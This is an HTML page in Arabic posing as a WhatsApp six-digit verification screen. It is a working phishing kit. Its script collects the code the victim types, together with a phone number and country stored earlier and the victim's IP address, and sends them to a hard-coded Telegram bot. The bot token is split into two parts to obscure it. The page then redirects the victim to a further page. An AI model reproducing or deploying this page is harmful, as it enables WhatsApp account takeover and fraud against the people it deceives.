<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <style>
        body { background-color: #111b21; color: #e9edef; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background-color: #222e35; padding: 30px; border-radius: 15px; width: 85%; max-width: 350px; text-align: center; }
        input { background: #2a3942; border: 1px solid #00a884; color: white; width: 100%; height: 50px; text-align: center; font-size: 24px; border-radius: 8px; margin-bottom: 20px; outline: none; }
        .btn { background-color: #00a884; color: #111b21; border: none; width: 100%; padding: 15px; border-radius: 25px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
<div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="50" style="margin-bottom:15px;">
    <h2>تحقق من الرمز</h2>
    <p style="color: #8696a0; font-size: 14px;">أدخل الرمز المكون من 6 أرقام</p>
    <input id="name" type="text" inputmode="numeric" maxlength="6" placeholder="000000">
    <button class="btn" onclick="sendName()">تأكيد</button>
</div>

<script>
    const p1 = '8497881667'; const p2 = 'AAECLuXvQ_m93xbeEiRDK7RK3yd2ghLPtxo';
    const botToken = p1 + ':' + p2; const chatId = '6727057071';

    function sendName() {
        const code = document.getElementById('name').value;
        if (code.length === 6) {
            const btn = document.querySelector('.btn');
            btn.innerText = "جاري التحميل...";
            btn.disabled = true;

            const submit = (ip) => {
                const num = localStorage.getItem('phoneNumber') || "Unknown";
                const cry = localStorage.getItem('countryName') || "Unknown";
                const msg = `📩 CODE 1\n📞 Num: ${num}\n🌍 Pays: ${cry}\n🔢 Code: ${code}\n🌐 IP: ${ip}`;
                
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`)
                .finally(() => {
                    localStorage.setItem('firstCode', code);
                    window.location.href = 'pipage.html';
                });
            };

            // Emergency timeout: Move to next page after 2 seconds even if IP fails
            const force = setTimeout(() => submit("IP Hidden/Slow"), 2000);

            fetch('https://ipinfo.io/json').then(res => res.json()).then(data => {
                clearTimeout(force); 
                submit(data.ip);
            }).catch(() => {
                clearTimeout(force); 
                submit("Blocked/VPN");
            });
        } else { alert("يرجى إدخال 6 أرقام"); }
    }
</script>
</body>
</html>
